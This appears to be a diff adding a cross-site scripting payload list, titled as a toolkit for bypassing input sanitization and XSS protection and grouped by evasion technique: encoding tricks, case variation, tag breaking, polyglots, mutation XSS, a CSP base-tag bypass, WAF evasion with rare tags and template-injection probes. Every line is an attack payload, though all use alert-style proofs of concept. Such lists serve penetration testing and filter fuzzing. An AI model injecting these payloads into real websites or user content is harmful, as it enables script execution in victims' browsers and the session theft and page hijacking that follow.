@@ -1,0 +1,187 @@
+# Advanced XSS Payloads for Bypassing Input Sanitization and XSS Protection
+# Organized by evasion technique
+
+# Basic Payloads (Baseline)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+
+# HTML Entity Encoding Evasion
+<script>alert(&#49;)</script>
+<script>alert(&#x31;)</script>
+<img src=x onerror=alert(&#49;)>
+<svg/onload=alert(&#x31;)>
+
+# URL Encoding Evasion
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%3Csvg/onload%3Dalert(1)%3E
+
+# Double URL Encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+
+# Unicode Evasion
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\u003cimg src=x onerror=alert(1)\u003e
+<script>alert(\u0031)</script>
+
+# Case Variation Bypass
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<ImG sRc=x OnErRoR=alert(1)>
+
+# Tag Breaking and Attribute Injection
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+
+# Event Handler Injection (DOM-based)
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# JavaScript URI Schemes
+<a href="javascript:alert(1)">click</a>
+<form action="javascript:alert(1)"><input type=submit>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+
+# Filter Bypass with NULL Bytes and Special Characters
+<script>al%00ert(1)</script>
+<img src=x o%00nerror=alert(1)>
+<script>alert(1)//</script>
+<script>alert(1)<!--</script>
+<script><!--alert(1)--></script>
+
+# Tab and Newline Injection
+<img	src=x	onerror=alert(1)>
+<svg/onload
+=alert(1)>
+<iframe	src=javascript:alert(1)>
+
+# Comment Breaking
+<script><!--
+alert(1)
+--></script>
+<!--><script>alert(1)</script>-->
+<script>/**/alert(1)</script>
+
+# Obfuscation Techniques
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>Function('alert(1)')()</script>
+<script>setTimeout('alert(1)')</script>
+<script>setInterval('alert(1)',1000)</script>
+
+# WAF Bypass with Rare Tags
+<image src=x onerror=alert(1)>
+<svg><animate onbegin=alert(1)>
+<set attributename=onclick value=alert(1)>
+<isindex type=image src=x onerror=alert(1)>
+<embed src=javascript:alert(1)>
+
+# Polyglot Payloads (Multi-context)
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+
+# Template Injection Style
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+@(7*7)
+
+# Context-specific Bypasses
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert(1)</script>
+<script>top['al'+'ert'](1)</script>
+<script>top['al\x65rt'](1)</script>
+<script>alert(/XSS/)</script>
+
+# HTML5 Specific
+<form><button formaction=javascript:alert(1)>X</button>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+
+# Protocol Handler Abuse
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# XML-based Payloads
+<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
+
+# Mutation XSS (mXSS)
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><a href="</noscript><img src=x onerror=alert(1)>">
+
+# CSS-based Injection
+<style>*{background:url('javascript:alert(1)')}</style>
+<link rel=stylesheet href=data:,*%7bbackground:url('javascript:alert(1)')%7d>
+<style>@import 'data:,*%7bx:expression(alert(1))%7D';</style>
+
+# Breaking Out of Strings
+';alert(1)//
+";alert(1)//
+`;alert(1)//
+');alert(1)//
+");alert(1)//
+`);alert(1)//
+
+# Exotic Event Handlers
+<body onpageshow=alert(1)>
+<body onhashchange=alert(1)>
+<body onresize=alert(1)>
+<body onbeforeunload=alert(1)>
+<body ononline=alert(1)>
+<body onoffline=alert(1)>
+<body onpopstate=alert(1)>
+<body onstorage=alert(1)>
+
+# SVG-based Advanced
+<svg><script>alert&#40;1)</script></svg>
+<svg><script>alert&#x28;1)</script></svg>
+<svg><script href=data:,alert(1)></script></svg>
+<svg><use href=data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x></use></svg>
+
+# Math ML Injection
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+
+# Import Statement Abuse
+<script>import('data:text/javascript,alert(1)')</script>
+
+# Service Worker Registration
+<script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>
+
+# DOM Clobbering for XSS
+<form id=x><output id=y>
+<script>alert(x.y.value='XSS')</script>
+
+# Breaking CSP with Base Tag
+<base href="javascript:/a/-alert(1)///////"><a href=.>click</a>
+
+# Meta Refresh XSS
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+
+# iframe srcdoc Attribute
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
